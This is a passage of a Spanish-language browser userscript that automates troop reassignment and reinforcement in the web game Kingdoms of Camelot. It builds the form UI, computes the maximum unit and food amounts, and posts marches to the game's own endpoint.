				//alert(parseInt(k)+1 + ' - ' + citytotal+ ' : ' + troopsselect[k] + ' / ' + t.reassignRoutes[0][troopsselect[k]]);

			}
			if(totalsend > maxsend){
				totalsend -= send[(parseInt(k)+1)];
				send[(parseInt(k)+1)] = parseInt(maxsend-totalsend);
				totalsend += send[(parseInt(k)+1)];
				break;
			}
       	}

    	for (var t=0; t< Seed.cities.length;t++) {
    		if ( parseInt(Seed.cities[t][0]) == city) var cityname = Seed.cities[t][1];
    	}

  		params.cid= city;
		params.type = "5";
		params.kid=0;
		params.xcoord = xcoord;
		params.ycoord = ycoord;
		params.u1 = send[1];
		params.u2 = send[2];
		params.u3 = send[3];
		params.u4 = send[4];
		params.u5 = send[5];
		params.u6 = send[6];
		params.u7 = send[7];
		params.u8 = send[8];
		params.u9 = send[9];
		params.u10 = send[10];
		params.u11 = send[11];
		params.u12 = send[12];

   		if (totalsend >0) {

      		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
                  method: "post",
                  parameters: params,
                  loading: true,
                  onSuccess: function (transport) {
                  var rslt = eval("(" + transport.responseText + ")");
                  if (rslt.ok) {
                  actionLog('REASIGNANDO  desde: ' + cityname + "   a: " + xcoord + ',' + ycoord + "    ->   Tropas: " + totalsend);
				  var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
                  var ut = unsafeWindow.unixtime();
                  var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
                  					for(i = 0; i <= unitsarr.length; i++){
                  						if(params["u"+i]){
                  								unitsarr[i] = params["u"+i];
                  						}
                  					}
                  var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
                  var currentcityid = city;
                  unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
                  if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
                  } else {
                  actionLog('FALLO DE REASIGNACIÓN :' + cityname + ' - ' + rslt.error_code + ' -  ' + rslt.msg + ' -  ' + rslt.feedback);
                  //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
                  }
                  },
                  onFailure: function () {}
          });
   	 }
	},

	show: function(){
		var t = Tabs.Reassign;
    },
	hide: function(){
        var t = Tabs.Reassign;
    },
    onUnload: function(){
        var t = Tabs.Reassign;
        if (!ResetAll) t.saveReassignRoutes();
		if (!ResetAll) t.saveReassignState();

    },
}


/************************  Reinforce Tab ************************/
Tabs.Reinforce = {
  tabOrder: 1,
  tabLabel: 'Reforzar',
  myDiv: null,
  cityID: null,
  rallypointlevel:null,
  maxsend:0,
  dist:0,
  ETAstr:null,
  ETAType:null,
  checkETA:null,

    init: function(div){
		var t = Tabs.Reinforce;
        t.myDiv = div;

      var m = '<DIV id=pbReinfMain class=pbStat>Reforzar</div><TABLE id=pireinforce width=100% height=0% class=pbTab><TR align="center">';

      m += '<TABLE id=pbReinf width=95% height=0% class=pbTab><TR align="left">';
      m += '<TD width=20px>Desde Ciudad:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptRfcityFrom></span></div></td></tr>';

      m += '<TR align="left">';
      m += '<TD>A Ciudad:</td> <TD width=310px><DIV style="margin-bottom:10px;"><span id=ptRfcityTo></span></div></td>';
      m += '<TD>Ó</td>';
      m += '<TD>X:<INPUT id=pfToX type=text size=3\></td>';
      m += '<TD>Y:<INPUT id=pfToY type=text size=3\></td></tr></table>';

      m += '<TABLE id=pbReinfETA width=95% height=0% class=pbTab><TR align="left">';
      m += '<TD><DIV id=pbdistance>Distancia N/A</div></td>';
      m += '<TD><DIV id=pbETA>Tiempo N/A</div></td>';
      m += '<TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png"></td>';
      m += '<TD><INPUT id=pisendfood type=text size=11 maxlength=11 value="0"\><INPUT id=MaxFood type=submit value="Max"></td></tr></table>';

      m += '<TABLE id=pbaddreinfroute width=100% height=0% class=pbTab><TR align="center">';
      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_50.jpg?6545"></td>';
      m += '<TD>Tro. Suministro</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50.jpg?6545"></td>'
      m += '<TD>Milicianos</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_50.jpg?6545"></td>'
      m += '<TD>Exploradores</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_50.jpg?6545"></td>'
      m += '<TD>Piqueros</td></tr>'
      m += '<TR><TD><INPUT id=pitargetSupplyTroops type=text size=6 maxlength=6 value="0"\><INPUT id=MaxSupplyTroops type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetMilitiaman type=text size=6 maxlength=6 value="0"\><INPUT id=MaxMilitiaman type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetScout type=text size=6 maxlength=6 value="0"\><INPUT id=MaxScout type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetPikeman type=text size=6 maxlength=6 value="0"\><INPUT id=MaxPikeman type=submit value="Max"></td></tr>';

      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_50.jpg?6545"></td>';
      m += '<TD>Espadachines</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_50.jpg?6545"></td>'
      m += '<TD>Arqueros</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_50.jpg?6545"></td>'
      m += '<TD>C. Ligera</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_50.jpg?6545"></td>'
      m += '<TD>C. Pesada</td></tr>'
      m += '<TR><TD><INPUT id=pitargetSwordsman type=text size=6 maxlength=6 value="0"\><INPUT id=MaxSwordsman type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetArcher type=text size=6 maxlength=6 value="0"\><INPUT id=MaxArcher type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetCavalry type=text size=6 maxlength=6 value="0"\><INPUT id=MaxCavalry type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetHeavyCavalry type=text size=6 maxlength=6 value="0"\><INPUT id=MaxHeavyCavalry type=submit value="Max"></td></tr>';

      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_50.jpg?6545"></td>';
      m += '<TD>C. Suministro</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50.jpg?6545"></td>'
      m += '<TD>Ballistas</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_50.jpg?6545"></td>'
      m += '<TD>Arrietes</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50.jpg?6545"></td>'
      m += '<TD>Catapultas</td></tr>'
      m += '<TR><TD><INPUT id=pitargetSupplyWagon type=text size=6 maxlength=6 value="0"\><INPUT id=MaxSupplyWagon type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetBallista type=text size=6 maxlength=6 value="0"\><INPUT id=MaxBallista type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetBatteringRam type=text size=6 maxlength=6 value="0"\><INPUT id=MaxBatteringRam type=submit value="Max"></td>';
      m += '<TD><INPUT id=pitargetCatapult type=text size=6 maxlength=6 value="0"\><INPUT id=MaxCatapult type=submit value="Max"></td></tr></table>';

      m += '<TABLE id=pbReinfETA width=95% height=0% class=pbTab><TR align="center">';
      m += '<TD><SELECT id=piKnight type=list></select></td>';
      m += '<TD><INPUT id=piDoreinforce type=submit value="Reforzar"></td>';

      t.myDiv.innerHTML = m;


      t.from = new CdispCityPicker ('prfrom', document.getElementById('ptRfcityFrom'), true, t.clickCitySelect, 0);
      t.to = new CdispCityPicker ('ptto', document.getElementById('ptRfcityTo'), true, t.clickCitySelect,0);

	  t.getKnights();

      document.getElementById('pfToX').value = t.to.city.x;
      document.getElementById('pfToY').value = t.to.city.y;

	 document.getElementById('ptRfcityTo').addEventListener('click', function(){
  	 document.getElementById('pfToX').value = t.to.city.x;
     document.getElementById('pfToY').value = t.to.city.y;
 	 }, false);

     document.getElementById('ptRfcityFrom').addEventListener('click', function(){
        t.dist = distance (t.from.city.x, t.from.city.y, document.getElementById('pfToX').value, document.getElementById('pfToY').value);
	    document.getElementById('pbdistance').innerHTML = ('Distancia: '+t.dist);
	    t.ETA(t.dist);
	    document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);


      document.getElementById('ptRfcityTo').addEventListener('click', function(){
       t.dist = distance (t.from.city.x, t.from.city.y, document.getElementById('pfToX').value, document.getElementById('pfToY').value);
          	document.getElementById('pbdistance').innerHTML = ('Distancia: '+t.dist);
          	t.ETA(t.dist);
          	document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);

      document.getElementById('pfToX').addEventListener('keyup', function(){
       t.dist = distance (t.from.city.x, t.from.city.y, document.getElementById('pfToX').value, document.getElementById('pfToY').value);
       		document.getElementById('pbdistance').innerHTML = ('Distancia: '+t.dist);
       		t.ETA(t.dist);
       		document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);

      document.getElementById('piDoreinforce').addEventListener('click', function(){
      		t.doReinforce();
      }, false);

      document.getElementById('MaxFood').addEventListener('click', function(){
     		var maxfood =0;
     		var featherweight = parseInt(Seed.tech.tch10);
     		maxfood += ( (200 + (200/10*featherweight)) * parseInt(document.getElementById('pitargetSupplyTroops').value));
     		maxfood += ( (20 + (20/10*featherweight)) *parseInt(document.getElementById('pitargetMilitiaman').value));
     		maxfood += ( (5 + (5/10*featherweight)) *parseInt(document.getElementById('pitargetScout').value));
     		maxfood += ((40 + (40/10*featherweight))*parseInt(document.getElementById('pitargetPikeman').value));
     		maxfood += ( (30 + (30/10*featherweight))*parseInt(document.getElementById('pitargetSwordsman').value));
     		maxfood += ((25 + (25/10*featherweight))*parseInt(document.getElementById('pitargetArcher').value));
     		maxfood += ((100 + (100/10*featherweight))*parseInt(document.getElementById('pitargetCavalry').value));
     		maxfood += (80*parseInt(document.getElementById('pitargetHeavyCavalry').value));
     		maxfood += ((5000 + (5000/10*featherweight))*parseInt(document.getElementById('pitargetSupplyWagon').value));
     		maxfood += ((35 + (35/10*featherweight))*parseInt(document.getElementById('pitargetBallista').value));
     		maxfood += ((45 + (45/10*featherweight))*parseInt(document.getElementById('pitargetBatteringRam').value));
     		maxfood += ((75 + (75/10*featherweight))*parseInt(document.getElementById('pitargetCatapult').value));
     		document.getElementById('pisendfood').value = maxfood;
     }, false);

	  document.getElementById('MaxSupplyTroops').addEventListener('click', function(){
      		t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetSupplyTroops').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+1]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+1]);
      		document.getElementById('pitargetSupplyTroops').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);

      document.getElementById('MaxMilitiaman').addEventListener('click', function(){
      		t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetMilitiaman').value == 0) t.maxsend = t.maxsend - othertroops;

          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+2]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+2]);
      		document.getElementById('pitargetMilitiaman').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);

      document.getElementById('MaxScout').addEventListener('click', function(){
      	t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetScout').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+3]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+3]);
      		document.getElementById('pitargetScout').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);

 	  document.getElementById('MaxPikeman').addEventListener('click', function(){
 	  	t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetPikeman').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+4]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+4]);
      		document.getElementById('pitargetPikeman').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxSwordsman').addEventListener('click', function(){
 	  		t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetSwordsman').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+5]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+5]);
      		document.getElementById('pitargetSwordsman').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxArcher').addEventListener('click', function(){
 	  	t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetArcher').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+6]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+6]);
      		document.getElementById('pitargetArcher').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxCavalry').addEventListener('click', function(){
 	  	t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetCavalry').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+7]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+7]);
      		document.getElementById('pitargetCavalry').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxHeavyCavalry').addEventListener('click', function(){
 	  		t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetHeavyCavalry').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+8]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+8]);
      		document.getElementById('pitargetHeavyCavalry').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxSupplyWagon').addEventListener('click', function(){
 	  		t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetSupplyWagon').value == 0) t.maxsend = t.maxsend - othertroops;
           if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+9]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+9]);
      		document.getElementById('pitargetSupplyWagon').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxBallista').addEventListener('click', function(){
 	  	t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetBallista').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+10]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+10]);
      		document.getElementById('pitargetBallista').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxBatteringRam').addEventListener('click', function(){
 	  		t.maxsend = (t.rallypointlevel * 10000);
